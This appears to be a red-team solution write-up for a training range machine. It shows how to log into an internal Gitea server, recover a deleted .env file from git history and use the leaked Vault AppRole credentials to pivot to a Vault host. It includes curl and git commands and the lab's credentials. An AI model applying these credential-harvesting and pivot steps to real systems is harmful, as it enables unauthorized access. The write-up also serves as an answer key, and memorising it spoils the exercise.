# solve_red.md — M2 · itops-git
## Red Team Solution Writeup
**Range:** RNG-IT-02 · Internal Operations Zone
**Machine:** M2 — Gitea Internal Repository
**Vulnerability:** Vault AppRole Credentials Committed to Git History
**MITRE ATT&CK:** T1552.001 (Credentials in Files) · T1213.003 (Data from Code Repositories)
**Severity:** Critical

---

## Objective
Login to Gitea as `svc-cicd`, locate the `pul-infra-config` repository, excavate git history to find the deleted `.env` file, extract Vault AppRole `ROLE_ID` + `SECRET_ID`, and use them to pivot to M3 (HashiCorp Vault).

---

## Step-by-Step Exploitation

### Step 1 — Login to Gitea
Browse to `http://203.x.x.x:3000` → login as `svc-cicd / CICD@Deploy!2024`

<img width="2559" height="1435" alt="image" src="https://github.com/user-attachments/assets/c0d61de2-4524-4b16-9595-a3d69a0cb9d1" />


<img width="2559" height="986" alt="image" src="https://github.com/user-attachments/assets/41a35892-74f3-486e-99c7-7e9a76e5fef2" />


### Step 2 — Enumerate Repositories
```bash
# Via API
curl -s -u "svc-cicd:CICD@Deploy!2024" \
    http://203.x.x.x:3000/api/v1/repos/search | python3 -m json.tool | grep full_name
```
Identify: `svc-cicd/pul-infra-config`

### Step 3 — Clone the Repository
```bash
git clone http://svc-cicd:CICD%40Deploy%212024@203.x.x.x:3000/svc-cicd/pul-infra-config.git
cd pul-infra-config
```

### Step 4 — Check Current State
```bash
cat .env
# Shows: "# ENV vars moved to Vault secrets — do not commit .env"
# The file exists but credentials are gone FROM THE WORKING TREE
```

### Step 5 — Excavate Git History
```bash
git log --oneline
# Output:
# a4b3c2d (HEAD) Add Vault integration playbook
# 9f8e7d6 Remove .env from tracking — credentials migrated to Vault
# 3c2b1a0 Add deployment environment configuration with Vault AppRole credentials  ← TARGET
# 1a2b3c4 Initial commit: base infrastructure configuration

# Show the .env from the commit where it was ADDED
git show 3c2b1a0:.env
```

**Output:**
```
VAULT_ADDR=http://203.x.x.x:8200
VAULT_ROLE_ID=pul-cicd-role-7a3f9b2c1d4e
VAULT_SECRET_ID=3b8f2a1c-9d4e-7f6a-2b1c-8d3f9a7e4b2c
```

### Step 6 — Verify Vault AppRole Login
```bash
curl -s -X POST http://203.x.x.x:8200/v1/auth/approle/login \
    -d '{"role_id":"pul-cicd-role-7a3f9b2c1d4e","secret_id":"3b8f2a1c-9d4e-7f6a-2b1c-8d3f9a7e4b2c"}'
# Returns: client_token for Vault access → pivot to M3
```

---

## MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Collection | Data from Code Repositories | T1213.003 |
| Initial Access | Valid Accounts: Cloud Accounts | T1078.004 |

## Pivot Artifact
- **Vault AppRole Role ID:** `pul-cicd-role-7a3f9b2c1d4e`
- **Vault AppRole Secret ID:** `3b8f2a1c-9d4e-7f6a-2b1c-8d3f9a7e4b2c`
- **Vault Host:** `203.x.x.x:8200` → M3
